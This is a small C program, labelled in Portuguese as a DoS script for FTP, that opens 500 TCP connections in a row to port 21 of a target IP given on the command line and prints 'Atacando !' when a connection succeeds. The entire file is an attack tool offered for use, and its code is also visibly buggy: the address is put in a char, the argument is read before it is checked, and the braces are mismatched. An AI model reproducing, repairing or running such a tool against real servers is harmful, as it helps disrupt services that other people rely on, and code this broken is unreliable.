#include <stdio.h>
#include <netdb.h>

main(int argc, char *argv[])
{

    int sock;
    int conexao;

    int dos;
    int inicio = 0;
    int final = 500;
    char  destino;
    destino = argv[1];


    if(argc<2){
        printf("##########################################\n");
        printf("#         Script de Dos para FTP         #\n");
        printf("#   Modo de uso: ./FtpDoS 192.168.0.1    #\n");
        printf("#   Autor: Kripto-Sec(Jean)              #\n");
        printf("##########################################\n");
}else{
    struct sockaddr_in alvo;
    for (dos=inicio;dos<final;dos++)
    {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        alvo.sin_family = AF_INET;
        alvo.sin_port = htons(21);
        alvo.sin_addr.s_addr = inet_addr(destino);

        conexao = connect(sock, (struct sockaddr *)&alvo, sizeof alvo);

}

    
        if(conexao == 0)
        {
            printf("Atacando ! \b");            
}else{
    close(sock);
    close(conexao);

    }

    }
}